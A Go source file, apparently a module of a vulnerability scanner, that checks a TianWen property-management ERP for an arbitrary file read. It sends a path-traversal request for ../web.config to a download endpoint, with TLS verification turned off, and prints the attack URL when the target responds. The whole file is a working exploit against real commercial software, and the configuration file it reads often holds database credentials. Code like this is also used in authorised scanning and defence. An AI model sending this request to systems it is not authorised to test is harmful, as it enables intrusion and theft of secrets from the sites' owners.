package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func TianWenWuYeERP_ArbitraryFileRead(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()),
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
		return err
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "web.config") {
		fmt.Println("[*]天问物业ERP系统任意文件读取漏洞 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
